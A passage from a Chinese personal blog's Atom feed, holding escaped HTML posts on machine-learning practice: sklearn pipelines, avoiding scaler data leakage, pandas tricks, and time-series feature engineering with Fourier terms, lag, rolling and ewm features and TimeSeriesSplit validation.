[(<span class="string">&#x27;s&#x27;</span>,StandardScaler()),(<span class="string">&#x27;m&#x27;</span>,model)]</span><br><span class="line">    <span class="keyword">return</span> Pipeline(steps)</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">val</span>(<span class="params">model,x,y,cv=<span class="number">10</span></span>):</span><br><span class="line">    <span class="keyword">return</span> cross_val_score(model,X,Y,cv=cv).mean()</span><br><span class="line"></span><br><span class="line">s = &#123;&#125;</span><br><span class="line"><span class="keyword">for</span> n,m <span class="keyword">in</span> get_models().items():</span><br><span class="line">    p = make_pipe(m)</span><br><span class="line">    s[n]=val(m,X,Y)</span><br><span class="line">order = <span class="built_in">sorted</span>(s.items(),key = <span class="keyword">lambda</span> x:x[<span class="number">1</span>],reverse=<span class="literal">True</span>)</span><br><span class="line">order</span><br><span class="line"></span><br><span class="line">pipe = make_pipe(GradientBoostingRegressor())</span><br><span class="line">best_model = pipe.fit(X,Y)</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">pred_date</span>(<span class="params">X_val</span>):</span><br><span class="line">    res = []</span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(X_val.shape[<span class="number">0</span>]):</span><br><span class="line">        pred = best_model.predict(np.array(X_val.iloc[i]).reshape(<span class="number">1</span>,-<span class="number">1</span>))</span><br><span class="line">        res.append(pred)</span><br><span class="line">        <span class="keyword">if</span> i+<span class="number">1</span> &lt; X_val.shape[<span class="number">0</span>]:</span><br><span class="line">            X_val.iloc[i+<span class="number">1</span>,-<span class="number">30</span>:] = X_val.iloc[i,-<span class="number">31</span>:-<span class="number">1</span>]</span><br><span class="line">            X_val.iloc[i+<span class="number">1</span>,-<span class="number">31</span>]=pred</span><br><span class="line">    <span class="keyword">return</span> X_val,res</span><br><span class="line">  </span><br><span class="line">X_val,res = pred_date(X_val) </span><br><span class="line"><span class="keyword">from</span> sklearn.metrics <span class="keyword">import</span> r2_score,mean_squared_error</span><br><span class="line">mean_squared_error(Y_val,res)</span><br><span class="line">r2_score(Y_val,res)</span><br></pre></td></tr></table></figure><h2><span id="踩坑">踩坑</span></h2><ul><li>关于数据预处理</li></ul><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><span class="line"><span class="string">&#x27;&#x27;&#x27;</span></span><br><span class="line"><span class="string">预处理的时候不能</span></span><br><span class="line"><span class="string">scaler.fit_trainsform(Xtest)</span></span><br><span class="line"><span class="string">或者</span></span><br><span class="line"><span class="string">scaler.fit(Xtest)</span></span><br><span class="line"><span class="string">scaler.transform(Xtest)</span></span><br><span class="line"><span class="string">因为会导致数据泄露</span></span><br><span class="line"><span class="string">&#x27;&#x27;&#x27;</span></span><br><span class="line">scaler = StandardScaler() <span class="comment">#实例化</span></span><br><span class="line">scaler.fit(Xtrain)</span><br><span class="line">X_train =scaler.transform(Xtrain)</span><br><span class="line">X_test =scaler.transform(Xtest)</span><br><span class="line">norm = MinMaxScaler()</span><br><span class="line">norm.fit(Xtrain)</span><br><span class="line">X_train = norm.transform(Xtrain)</span><br><span class="line">X_test = norm.transform(Xtest)</span><br><span class="line"></span><br><span class="line">scaler = StandardScaler() <span class="comment">#实例化</span></span><br><span class="line">X_train =scaler.fit_transform(Xtrain)</span><br><span class="line">X_test =scaler.transform(Xtest)</span><br><span class="line">norm = MinMaxScaler()</span><br><span class="line">norm.fit(Xtrain)</span><br><span class="line">X_train = norm.fit_transform(Xtrain)</span><br><span class="line">X_test = norm.transform(Xtest)</span><br></pre></td></tr></table></figure><ul><li><p>关于预测</p><p>预测的时候要将整个数据拿去fit,然后再去predict</p></li></ul><h2><span id="trick">Trick</span></h2><ul><li><p>get_dummies的时候最好先把 预测集和测试集合并再分开X[:x.shape[0]]</p></li><li><p>factorized转换回去</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">orig_col = [<span class="string">&#x27;b&#x27;</span>, <span class="string">&#x27;b&#x27;</span>, <span class="string">&#x27;a&#x27;</span>, <span class="string">&#x27;c&#x27;</span>, <span class="string">&#x27;b&#x27;</span>]</span><br><span class="line">labels, uniques = pd.factorize(orig_col)</span><br><span class="line"></span><br><span class="line"><span class="comment"># To get original list back</span></span><br><span class="line">uniques[labels]</span><br><span class="line"><span class="comment"># array([&#x27;b&#x27;, &#x27;b&#x27;, &#x27;a&#x27;, &#x27;c&#x27;, &#x27;b&#x27;], dtype=object)</span></span><br></pre></td></tr></table></figure></li><li><p>pandas改变行序列</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">col=[<span class="string">&#x27;a&#x27;</span>,<span class="string">&#x27;c&#x27;</span>,<span class="string">&#x27;d&#x27;</span>]</span><br><span class="line">df[col]</span><br></pre></td></tr></table></figure></li><li><p>按月份统计 </p><ul><li>A 星期</li><li>B 月份</li></ul><p><code>df.groupby(df[&#39;date&#39;].dt.strftime(&#39;%B&#39;))[&#39;price&#39;].mean()</code></p><p><code>df[&#39;month&#39;] = df[&#39;Date&#39;].dt.month</code></p></li><li><p>排序后按自定义顺序显示</p><p><code>cat = [&#39;a&#39;,&#39;b&#39;,&#39;c&#39;]</code></p><p><code>df.groupby(&#39;f&#39;).reindex(cat)</code></p></li><li><p>透视</p><p><code>df = df.groupby(&#39;name&#39;,&#39;year&#39;)[&#39;gdp&#39;].sum().reindex()</code></p><p><code>df.pivot(index=&#39;name&#39;,columns=&#39;year&#39;,values=&#39;gdp&#39;)</code></p><p>![透视前](&#x2F;Users&#x2F;disda&#x2F;Library&#x2F;Application Support&#x2F;typora-user-images&#x2F;image-20220310161405868.png)</p><p>![透视后](&#x2F;Users&#x2F;disda&#x2F;Library&#x2F;Application Support&#x2F;typora-user-images&#x2F;image-20220310161422071.png)</p><p><strong>定类数据</strong></p><p>字符型，此类数据只代表“类别”，类别与类别之间没有必然的相关关系，提供的信息量也最少。例如（颜色：红色，黄色，蓝色，绿色）</p><p>处理方式：ｏｎｅ－ｈｏｔ编码</p><p><strong>定序数据</strong></p><p>字符型，此类数据代表“类别”的同时类别与类别之间可以比较，有顺序。例如（品质：优，良，中，差）</p><p>处理方式：对字符型数值赋值</p><p><strong>定距数据</strong></p><p>数值型，可加减。用于统计计数。例如（卧室数量）</p><p>处理方式：极差缩放，标准化</p><p><strong>定比数据</strong></p><p>数值型，可加减乘除，有绝对“０”值的概念。例如（工资，￥１００是￥５０的２倍）</p><p>处理方式：极差缩放，数值归一化，标准化</p></li></ul>]]></content>
    
    
      
      
    <summary type="html">&lt;link rel=&quot;stylesheet&quot; class=&quot;aplayer-secondary-style-marker&quot; href=&quot;/assets/css/APlayer.min.css&quot;&gt;&lt;script src=&quot;/assets/js/APlayer.min.js&quot; cla</summary>
      
    
    
    
    <category term="机器学习" scheme="https://disda-coding.github.io/categories/%E6%9C%BA%E5%99%A8%E5%AD%A6%E4%B9%A0/"/>
    
    
    <category term="机器学习" scheme="https://disda-coding.github.io/tags/%E6%9C%BA%E5%99%A8%E5%AD%A6%E4%B9%A0/"/>
    
  </entry>
  
  <entry>
    <title>机器学习时间序列实战</title>
    <link href="https://disda-coding.github.io/2022/02/14/%E6%9C%BA%E5%99%A8%E5%AD%A6%E4%B9%A0%E6%97%B6%E9%97%B4%E5%BA%8F%E5%88%97%E5%AE%9E%E6%88%98/"/>
    <id>https://disda-coding.github.io/2022/02/14/%E6%9C%BA%E5%99%A8%E5%AD%A6%E4%B9%A0%E6%97%B6%E9%97%B4%E5%BA%8F%E5%88%97%E5%AE%9E%E6%88%98/</id>
    <published>2022-02-14T02:58:06.000Z</published>
    <updated>2023-03-29T01:01:32.122Z</updated>
    
    <content type="html"><![CDATA[<link rel="stylesheet" class="aplayer-secondary-style-marker" href="/assets/css/APlayer.min.css"><script src="/assets/js/APlayer.min.js" class="aplayer-secondary-script-marker"></script><span id="more"></span><!-- toc --><ul><li><a href="#%E6%99%AE%E9%80%9A%E7%9A%84%E7%89%B9%E5%BE%81">普通的特征</a></li><li><a href="#%E5%82%85%E9%87%8C%E5%8F%B6%E7%BA%A7%E6%95%B0">傅里叶级数</a></li><li><a href="#diff%E5%B7%AE%E5%88%86shift%E5%B9%B3%E7%A7%BBewmrolling">diff差分&#x2F;shift平移&#x2F;ewm&#x2F;rolling</a></li><li><a href="#%E9%AA%8C%E8%AF%81%E6%96%B9%E6%B3%95">验证方法</a></li></ul><!-- tocstop --><h2><span id="普通的特征">普通的特征</span></h2><p><strong>不要认为结果集的month没有出现在训练集就不加，要相信模型的能力。</strong></p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">ID = <span class="string">&#x27;DateTime&#x27;</span></span><br><span class="line"><span class="comment"># df[&#x27;year&#x27;] = df[ID].dt.year </span></span><br><span class="line">df[<span class="string">&#x27;month&#x27;</span>]=df[ID].dt.month</span><br><span class="line">df[<span class="string">&#x27;quarter&#x27;</span>]=df[ID].dt.quarter</span><br><span class="line">df[<span class="string">&#x27;day&#x27;</span>]=df[ID].dt.day</span><br><span class="line">df[<span class="string">&#x27;dayofweek&#x27;</span>]=df[ID].dt.dayofweek</span><br><span class="line">df[<span class="string">&#x27;dayofyear&#x27;</span>]=df[ID].dt.dayofyear</span><br><span class="line">df[<span class="string">&#x27;week&#x27;</span>]=df[ID].dt.week</span><br><span class="line">df[<span class="string">&#x27;hour&#x27;</span>]=df[ID].dt.hour</span><br><span class="line">df[<span class="string">&#x27;weekend&#x27;</span>]=df[<span class="string">&#x27;dayofweek&#x27;</span>].apply(<span class="keyword">lambda</span> x:<span class="number">1</span> <span class="keyword">if</span> x&gt;=<span class="number">5</span> <span class="keyword">else</span> <span class="number">0</span>)</span><br></pre></td></tr></table></figure><h2><span id="傅里叶级数">傅里叶级数</span></h2><p><strong>使得月份，天数等等连续，例如1-12月，1和12差距过大，如果使用傅里叶级数的话相当于变成sin或者cos表示，形成一个圆。</strong></p><ul><li>其中<strong>fs</strong>是看数据的，像这个数据给的是一小时采样6次数据，一年就是1*6*24*365，如果是一天一采的数据就365</li></ul><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> scipy.signal <span class="keyword">import</span> periodogram</span><br><span class="line">F,S=periodogram(tr[out_cols],fs=<span class="number">1</span>*<span class="number">6</span>*<span class="number">24</span>*<span class="number">365</span>,detrend=<span class="string">&#x27;linear&#x27;</span>)</span><br><span class="line">plt.plot(F,S)</span><br><span class="line">plt.xscale(<span class="string">&#x27;log&#x27;</span>)</span><br><span class="line">plt.xticks([<span class="number">1</span>,<span class="number">2</span>,<span class="number">4</span>,<span class="number">12</span>,<span class="number">24</span>,<span class="number">52</span>,<span class="number">104</span>,<span class="number">365</span>,<span class="number">365</span>*<span class="number">2</span>],[<span class="string">&#x27;A&#x27;</span>,<span class="string">&#x27;hA&#x27;</span>,<span class="string">&#x27;Q&#x27;</span>,<span class="string">&#x27;M&#x27;</span>,<span class="string">&#x27;hM&#x27;</span>,<span class="string">&#x27;W&#x27;</span>,<span class="string">&#x27;hW&#x27;</span>,<span class="string">&#x27;D&#x27;</span>,<span class="string">&#x27;hD&#x27;</span>])</span><br><span class="line">plt.show()</span><br></pre></td></tr></table></figure><ul><li>查看图像最高的值，时间相关性就会比较高</li></ul><figure class="highlight txt"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">&#x27;B&#x27; - business day, ie., Mon. - Fri.</span><br><span class="line">&#x27;D&#x27; - daily</span><br><span class="line">&#x27;W&#x27; - weekly</span><br><span class="line">&#x27;M&#x27; - monthly</span><br><span class="line">&#x27;A&#x27; - annual</span><br><span class="line">&#x27;Q&#x27; - quarterly</span><br></pre></td></tr></table></figure><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> statsmodels.tsa.deterministic <span class="keyword">import</span> DeterministicProcess,CalendarFourier</span><br><span class="line"><span class="comment">#傅里叶</span></span><br><span class="line">CF1=CalendarFourier(<span class="string">&#x27;A&#x27;</span>,<span class="number">1</span>)</span><br><span class="line">CF2=CalendarFourier(<span class="string">&#x27;W&#x27;</span>,<span class="number">2</span>)</span><br><span class="line">CF3=CalendarFourier(<span class="string">&#x27;D&#x27;</span>,<span class="number">4</span>)</span><br><span class="line">dp = DeterministicProcess(index=df.DateTime,additional_terms=[CF1,CF2,CF3,CF4]).in_sample()</span><br><span class="line">df = df.merge(dp,left_on=<span class="string">&#x27;datetime&#x27;</span>,right_index=<span class="literal">True</span>,how=<span class="string">&#x27;left&#x27;</span>)</span><br></pre></td></tr></table></figure><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">def</span> <span class="title function_">make_m</span>(<span class="params">m=&#123;&#125;</span>):</span><br><span class="line">    m[<span class="string">&#x27;RandomForestRegressor&#x27;</span>] = RandomForestRegressor(random_state=<span class="number">10</span>)</span><br><span class="line">    m[<span class="string">&#x27;GradientBoostingRegressor&#x27;</span>] = GradientBoostingRegressor(random_state=<span class="number">10</span>)</span><br><span class="line">    m[<span class="string">&#x27;ExtraTreesRegressor&#x27;</span>] = ExtraTreesRegressor(random_state=<span class="number">10</span>)</span><br><span class="line">    m[<span class="string">&#x27;LGBMRegressor&#x27;</span>] = LGBMRegressor(random_state=<span class="number">10</span>)</span><br><span class="line">    m[<span class="string">&#x27;LinearRegression&#x27;</span>] = LinearRegression()</span><br><span class="line">    m[<span class="string">&#x27;HuberRegressor&#x27;</span>] = HuberRegressor()</span><br><span class="line">    <span class="keyword">return</span> m</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">split_df</span>(<span class="params">df,name</span>):</span><br><span class="line">    train = df[:tr.shape[<span class="number">0</span>]]</span><br><span class="line">    test = df[tr.shape[<span class="number">0</span>]:]</span><br><span class="line">    x = train.drop(name,<span class="number">1</span>)</span><br><span class="line">    x_pre = test.drop(name,<span class="number">1</span>)</span><br><span class="line">    y = train[name]</span><br><span class="line">    <span class="keyword">return</span> x,y,x_pre</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">make_p</span>(<span class="params">l,m</span>):</span><br><span class="line">    s = l.copy()</span><br><span class="line">    s.append((<span class="string">&#x27;m&#x27;</span>,m))</span><br><span class="line">    <span class="keyword">return</span> Pipeline(s)</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">valid_cv</span>(<span class="params">p,x,y,cv=<span class="number">5</span>,log=<span class="literal">True</span></span>):</span><br><span class="line">    <span class="keyword">return</span> cross_val_score(p,x,y,cv=cv).mean()</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">valid</span>(<span class="params">p,x,y,cv=<span class="number">5</span>,log=<span class="literal">True</span></span>):</span><br><span class="line">    s = <span class="number">0</span></span><br><span class="line">    tss = TimeSeriesSplit(n_splits=cv)</span><br><span class="line">    <span class="keyword">for</span> tri,tei <span class="keyword">in</span> tss.split(x):</span><br><span class="line">        Xtr,Xte = x.iloc[tri,:],x.iloc[tei]</span><br><span class="line">        Ytr,Yte = y.iloc[tri],y.iloc[tei]</span><br><span class="line">        ans = p.fit(Xtr,Ytr).predict(Xte)</span><br><span class="line">        <span class="keyword">if</span> log:</span><br><span class="line">            ans = np.expm1(ans)</span><br><span class="line">        s+=r2_score(Yte,ans)</span><br><span class="line">    <span class="keyword">return</span> s/cv</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">test_df</span>(<span class="params">l,df,name,log=<span class="literal">True</span>,s=&#123;&#125;,func=valid</span>):</span><br><span class="line">    x,y,x_pre = split_df(df,name)</span><br><span class="line">    <span class="keyword">if</span> log:</span><br><span class="line">        y = np.log1p(y)</span><br><span class="line">    <span class="keyword">for</span> n,m <span class="keyword">in</span> make_m().items():</span><br><span class="line">        p = make_p(l,m)</span><br><span class="line">        s[n] = func(p,x,y)</span><br><span class="line">    <span class="keyword">return</span> <span class="built_in">sorted</span>(s.items(),key = <span class="keyword">lambda</span> x:x[<span class="number">1</span>],reverse=<span class="literal">True</span>)</span><br></pre></td></tr></table></figure><h2><span id="diff差分x2fshift平移x2fewmx2frolling">diff差分&#x2F;shift平移&#x2F;ewm&#x2F;rolling</span></h2><p>主要用于特征制作lag的值，可以多尝试，target值也可以尝试ewm，但是这道题没用。</p><ul><li>diff(i)</li></ul><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">features =[<span class="string">&#x27;Temperature&#x27;</span>,<span class="string">&#x27;Humidity&#x27;</span>]</span><br><span class="line">rang = [<span class="number">1</span>,<span class="number">2</span>,<span class="number">3</span>]</span><br><span class="line"><span class="keyword">for</span> f <span class="keyword">in</span> features:</span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> rang:</span><br><span class="line">        df[<span class="string">f&#x27;<span class="subst">&#123;f&#125;</span>_lag_<span class="subst">&#123;i&#125;</span>&#x27;</span>] = df[f].diff(i).bfill()</span><br></pre></td></tr></table></figure><ul><li>rolling.mean()</li></ul><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">features =[<span class="string">&#x27;Temperature&#x27;</span>,<span class="string">&#x27;Humidity&#x27;</span>]</span><br><span class="line">rang = [<span class="number">1</span>,<span class="number">2</span>,<span class="number">3</span>]</span><br><span class="line"><span class="keyword">for</span> f <span class="keyword">in</span> features:</span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> rang:</span><br><span class="line">        df[<span class="string">f&#x27;<span class="subst">&#123;f&#125;</span>_rolling_<span class="subst">&#123;i&#125;</span>&#x27;</span>] = df[f].rolling(i).mean().bfill()</span><br></pre></td></tr></table></figure><ul><li>ewm 标签(可能数据泄露？)</li></ul><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">def</span> <span class="title function_">ts_ft</span>(<span class="params">x, by, on</span>):</span><br><span class="line">    x.sort_values(by+[<span class="string">&#x27;dt&#x27;</span>], inplace=<span class="literal">True</span>)</span><br><span class="line">    names = [<span class="string">&#x27;mean&#x27;</span>, <span class="string">&#x27;std&#x27;</span>, <span class="string">&#x27;median&#x27;</span>, <span class="string">&#x27;min&#x27;</span>, <span class="string">&#x27;max&#x27;</span>, <span class="string">&#x27;skew&#x27;</span>, <span class="string">&#x27;kurt&#x27;</span>]</span><br><span class="line">    sta = &#123;s:[] <span class="keyword">for</span> s <span class="keyword">in</span> names&#125;</span><br><span class="line">    alphas = [<span class="number">0.1</span>, <span class="number">0.3</span>, <span class="number">0.5</span>, <span class="number">0.7</span>, <span class="number">0.9</span>]</span><br><span class="line">    <span class="keyword">for</span> a <span class="keyword">in</span> alphas:</span><br><span class="line">        sta[<span class="string">&#x27;ewm_&#123;&#125;&#x27;</span>.<span class="built_in">format</span>(a)] = []</span><br><span class="line">    </span><br><span class="line">    <span class="keyword">for</span> _, g <span class="keyword">in</span> x.groupby(by):</span><br><span class="line">        val = g[on]</span><br><span class="line">        rolled = val.rolling(window=<span class="built_in">len</span>(g), min_periods=<span class="number">1</span>)</span><br><span class="line">        <span class="keyword">for</span> s <span class="keyword">in</span> names:</span><br><span class="line">            sta[s].extend(<span class="built_in">getattr</span>(rolled, s)().fillna(method=<span class="string">&#x27;bfill&#x27;</span>))</span><br><span class="line">            </span><br><span class="line">        <span class="keyword">for</span> a <span class="keyword">in</span> alphas:</span><br><span class="line">            ewm = val.ewm(alpha=a, adjust=<span class="literal">False</span>).mean()</span><br><span class="line">            sta[<span class="string">&#x27;ewm_&#123;&#125;&#x27;</span>.<span class="built_in">format</span>(a)].extend(ewm)</span><br><span class="line">    </span><br><span class="line">    <span class="keyword">for</span> s <span class="keyword">in</span> sta:</span><br><span class="line">        ft_name = <span class="string">&#x27;&#123;&#125;_on_&#123;&#125;_by_&#123;&#125;&#x27;</span>.<span class="built_in">format</span>(s, on, by)</span><br><span class="line">        x[ft_name] = sta[s]</span><br></pre></td></tr></table></figure><ul><li>ewm 特征变量</li></ul><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">def</span> <span class="title function_">time_series_feature</span>(<span class="params">X,days=<span class="number">1</span></span>):</span><br><span class="line">    <span class="keyword">for</span> alpha <span class="keyword">in</span> np.linspace(<span class="number">0.1</span>, <span class="number">1</span>, <span class="number">10</span>):</span><br><span class="line">    <span class="comment">#     X_train[f&quot;&#123;alpha&#125;ewm_var1&quot;] = X_train[&#x27;var1&#x27;].ewm(alpha=alpha).mean()</span></span><br><span class="line">        <span class="keyword">for</span> n <span class="keyword">in</span> [<span class="string">&#x27;temperature&#x27;</span>, <span class="string">&#x27;windspeed&#x27;</span>]:</span><br><span class="line">            X[<span class="string">f&quot;<span class="subst">&#123;alpha&#125;</span>ewm_<span class="subst">&#123;n&#125;</span>&quot;</span>] = X[n].shift(days).ewm(alpha=alpha, adjust=<span class="literal">False</span>).mean().bfill()</span><br><span class="line">        <span class="keyword">for</span> m <span class="keyword">in</span> [<span class="string">&#x27;var1&#x27;</span>, <span class="string">&#x27;temperature&#x27;</span>, <span class="string">&#x27;windspeed&#x27;</span>]:</span><br><span class="line">            w = <span class="built_in">int</span>(alpha*<span class="number">20</span>)</span><br><span class="line">            <span class="comment"># rolled = X[m].shift().rolling(window=w, min_periods=1)</span></span><br><span class="line">            X[<span class="string">f&quot;<span class="subst">&#123;w&#125;</span>std_<span class="subst">&#123;m&#125;</span>&quot;</span>] = X[m].shift(days).rolling(window=w, min_periods=<span class="number">1</span>).std().bfill()</span><br><span class="line">    <span class="keyword">return</span> X</span><br></pre></td></tr></table></figure><ul><li>lagging 标签（可能没啥用，缺失值太多了）</li></ul><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">def</span> <span class="title function_">create_lagging</span>(<span class="params">df, df_original, i</span>):</span><br><span class="line">    df1 = df_original.copy()</span><br><span class="line">    df1[<span class="string">&#x27;visit_date&#x27;</span>] = df1[<span class="string">&#x27;visit_date&#x27;</span>] + pd.DateOffset(</span><br><span class="line">        days=i)</span><br><span class="line">    df1 = df1.rename(columns=&#123;<span class="string">&#x27;visitors&#x27;</span>: <span class="string">&#x27;lagging&#x27;</span> + <span class="built_in">str</span>(i)&#125;)</span><br><span class="line">    df2 = pd.merge(df,</span><br><span class="line">                   df1[[<span class="string">&#x27;air_store_id&#x27;</span>, <span class="string">&#x27;visit_date&#x27;</span>, <span class="string">&#x27;lagging&#x27;</span> + <span class="built_in">str</span>(i)]],</span><br><span class="line">                   on=[<span class="string">&#x27;air_store_id&#x27;</span>, <span class="string">&#x27;visit_date&#x27;</span>],</span><br><span class="line">                   how=<span class="string">&#x27;left&#x27;</span>)</span><br><span class="line">    <span class="keyword">return</span> df2</span><br><span class="line">  </span><br><span class="line">lagging = <span class="number">21</span></span><br><span class="line">data1 = df.copy()</span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">2</span>, lagging+<span class="number">1</span>):</span><br><span class="line">    data1 = create_lagging(data1, df, i)</span><br></pre></td></tr></table></figure><h2><span id="验证方法">验证方法</span></h2><ul><li>只能看是否改进了，但是分数偏低</li></ul><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># 每次循环都会增大X，在这题比较准确。</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">valid</span>(<span class="params">p,X,y,cv=<span class="number">5</span></span>):</span><br><span class="line">    tss = TimeSeriesSplit(max_train_size=<span class="literal">None</span>, n_splits=cv)</span><br><span class="line">    s = <span class="number">0</span></span><br><span class="line">    <span class="keyword">for</span> tr_i,te_i <span class="keyword">in</span> tss.split(x):</span><br><span class="line">        <span class="comment"># print(tr_i)</span></span><br><span class="line">        X_train,X_test = X.iloc[tr_i,:],X.iloc[te_i,:]</span><br><span class="line">        y_train,y_test = y.iloc[tr_i,:],y.iloc[te_i,:]</span><br><span class="line">        <span class="comment"># y_train,y_test = y.iloc[tr_i],y.iloc[te_i] y为一维的时候</span></span><br><span class="line">        s+=r2_score(y_test,p.fit(X_train,y_train).predict(X_test))</span><br><span class="line">    <span class="keyword">return</span> s/cv</span><br></pre></td></tr></table></figure><ul><li>经典的交叉验证分数比较高，能把控一下大概方向对不对。</li></ul><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">def</span> <span class="title function_">valid_cv</span>(<span class="params">p,x,y,cv=<span class="number">5</span>,log=<span class="literal">True</span></span>):</span><br><span class="line">    <span class="keyword">return</span> cross_val_score(p,x,y,cv=cv).mean()</span><br></pre></td></tr></table></figure>]]></content>
    
    
      
      
    <summary type="html">&lt;link rel=&quot;stylesheet&quot; class=&quot;aplayer-secondary-style-marker&quot; href=&quot;/assets/css/APlayer.min.css&quot;&gt;&lt;script src=&quot;/assets/js/APlayer.min.js&quot; cla</summary>
      
    
    
    
    <category term="机器学习" scheme="https://disda-coding.github.io/categories/%E6%9C%BA%E5%99%A8%E5%AD%A6%E4%B9%A0/"/>
    
    
    <category term="机器学习 大数据 pandas" scheme="https://disda-coding.github.io/tags/%E6%9C%BA%E5%99%A8%E5%AD%A6%E4%B9%A0-%E5%A4%A7%E6%95%B0%E6%8D%AE-pandas/"/>
    
  </entry>
  
  <entry>
    <title>大数据建模</title>
    <link href="https://disda-coding.github.io/2022/02/14/%E5%A4%A7%E6%95%B0%E6%8D%AE%E5%BB%BA%E6%A8%A1/"/>
    <id>https://disda-coding.github.io/2022/02/14/%E5%A4%A7%E6%95%B0%E6%8D%AE%E5%BB%BA%E6%A8%A1/</id>
    <published>2022-02-14T02:58:06.000Z</published>
    <updated>2023-03-29T01:01:03.261Z</updated>
    
